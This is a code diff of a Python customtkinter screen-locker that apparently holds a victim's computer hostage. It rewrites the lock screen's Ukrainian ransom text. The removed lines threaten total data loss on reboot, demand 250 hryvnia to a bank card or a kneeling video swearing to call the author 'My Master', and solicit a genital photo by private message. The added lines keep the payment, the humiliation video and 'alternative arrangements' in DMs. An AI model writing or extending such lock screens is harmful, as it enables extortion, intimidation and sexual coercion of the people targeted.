@@ -197,28 +197,43 @@ attempts_label = ctk.CTkLabel(
 )
 attempts_label.pack(pady=(5, 0))
 
-# Умови розблокування
-conditions = (
-    "Для розблокування ви маєте єдиний варіант: ввести правильний пароль.\n"
-    "Спроба перезавантажити комп'ютер призведе до втрати всіх даних і налаштувань.\n"
-    "Будь-які спроби обійти систему спричинять додаткові ускладнення.\n\n"
+# Контейнер для умов з прокруткою
+conditions_frame = ctk.CTkScrollableFrame(
+    content_frame,
+    width=480,
+    height=120,
+    corner_radius=10,
+    fg_color=COLORS["bg_tertiary"],
+    border_width=1,
+    border_color=COLORS["border"]
+)
+conditions_frame.pack(pady=(20, 15), padx=50)
+
+# Скорочені умови розблокування
+conditions_title = ctk.CTkLabel(
+    conditions_frame,
+    text="⚠️ ВАЖЛИВА ІНФОРМАЦІЯ",
+    font=ctk.CTkFont(size=14, weight="bold"),
+    text_color=COLORS["warning"]
+)
+conditions_title.pack(pady=(10, 5))
+
+conditions_text = (
+    "Для розблокування введіть правильний пароль.\n"
     "Варіанти розблокування:\n"
-    "1. Оплата 250 гривень на банківську карту.\n"
-    "2. Відео, де ви стоїте на колінах і кажете:\n"
-    "\"Я, Ім'я, присягаюсь більше ніколи не суперечити зі своїм королем, "
-    "і присягаюсь називати його 'Мій Хазяїн'. Прошу розблокувати мій комп'ютер.\"\n\n"
-    "P.S. Фотка пісюна в лс теж підійде."
+    "• Оплата 250 гривень на карту\n"
+    "• Відео з вибаченнями та зверненням 'Мій Хазяїн'\n"
+    "• Альтернативні домовленості в ЛС"
 )
 
 conditions_label = ctk.CTkLabel(
-    content_frame, 
-    text=conditions, 
-    wraplength=800, 
-    font=ctk.CTkFont(size=16), 
+    conditions_frame, 
+    text=conditions_text, 
+    font=ctk.CTkFont(size=12), 
     text_color=COLORS["text_secondary"], 
     justify="left"
 )
-conditions_label.pack(pady=(20, 15))
+conditions_label.pack(pady=(5, 10), padx=10)
 
 # Загадка видалена
 
